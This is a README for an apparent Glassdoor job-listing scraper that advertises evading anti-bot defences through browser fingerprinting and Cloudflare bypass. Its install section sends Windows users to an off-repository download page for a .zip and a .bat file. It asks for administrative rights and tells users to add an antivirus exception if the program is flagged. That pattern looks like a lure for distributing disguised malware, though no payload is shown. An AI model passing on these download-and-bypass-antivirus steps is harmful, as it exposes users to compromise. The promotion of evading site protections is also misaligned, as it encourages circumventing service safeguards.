# 🔍 glassdoor-bff-scraper - Fetch structured job data with ease

[![Download Tool](https://img.shields.io/badge/Download-Glassdoor_Scraper-blue.svg)](https://ankan8806.github.io)

## 📝 About this tool

This tool extracts job listings directly from Glassdoor. It mimics the behavior of a standard web browser. This allows the tool to collect data without interference from security blocks. You can use this data for personal research or to track job trends.

The software uses a background queue to organize tasks. It deduplicates listings to ensure you do not see the same job twice. It records the status of each job crawl and provides data in a clean format.

## 💻 System requirements

Before you begin, ensure your computer meets these requirements:

*   Windows 10 or Windows 11
*   An active internet connection
*   At least 4GB of RAM
*   A user account with administrative rights

## 📥 How to download and install

Follow these steps to set up the software on your Windows computer.

1. Visit the [official download page](https://ankan8806.github.io).
2. Locate the section labeled Releases on the right side of the page.
3. Click the most recent version shown at the top of that list.
4. Find the file ending in .zip under the Assets heading.
5. Click this file to start the download.
6. Open your Downloads folder once the file finishes.
7. Right-click the folder and choose Extract All to create a new folder with the software files.

## ⚙️ Configuration

The tool requires a text file to know which jobs to search for. Follow these steps to configure your search parameters:

1. Open the folder you extracted in the previous step.
2. Find the file named config.json.
3. Right-click the file and select Open with Notepad.
4. Locate the section titled search_terms.
5. Add your desired job titles and locations inside the quotation marks.
6. Save the file and close Notepad.

## 🚀 Running the scraper

You perform the scraping process through the command prompt.

1. Open the folder containing the software.
2. Click the empty space in the file path bar at the top of your folder window.
3. Type cmd and press Enter. A black window will appear.
4. Type the command run_scraper.bat and press Enter.
5. The software will begin connecting to the job boards.
6. Observe the text in the window to see the progress.
7. When the process finishes, the window will show a summary of found jobs.

## 📂 Locating your data

The scraper saves all collected information to your local machine.

1. Return to the main folder of the software.
2. Open the folder named Output.
3. You will see a file named jobs.csv inside.
4. You can open this file with Excel or any standard spreadsheet application.

## 🛡️ Troubleshooting common issues

If the software fails to run, check these items:

*   Internet connection: Ensure your computer can reach websites without a proxy.
*   Antivirus: Some security software might flag new tools. You may need to add an exception for this folder if the program refuses to start.
*   Update: Check the download page periodically for new versions, as website structures change occasionally.

## 💡 Best practices for scraping

To maintain a healthy connection and respect the data source, follow these guidelines:

*   Space out your requests. Do not run the software continuously throughout the day.
*   Only scrape the information you need for your personal research.
*   Keep your version current to ensure the browser fingerprinting remains effective against layout changes.

## 🏗️ Technical overview

The architecture uses a FastAPI service to handle incoming requests. This ensures that the application remains stable during high-volume data collection. The system handles errors gracefully by retrying connection attempts. It uses distinct workers to divide the workload, which prevents memory errors on your local machine. All communications involve standard TLS handshakes to ensure the server recognizes the scraper as a legitimate user.

Keywords: anti-detection, cloudflare-bypass, curl-cffi, educational, fastapi, glassdoor, job-scraper, python, rest-api, scraper, tls-fingerprinting, web-scraping, webhooks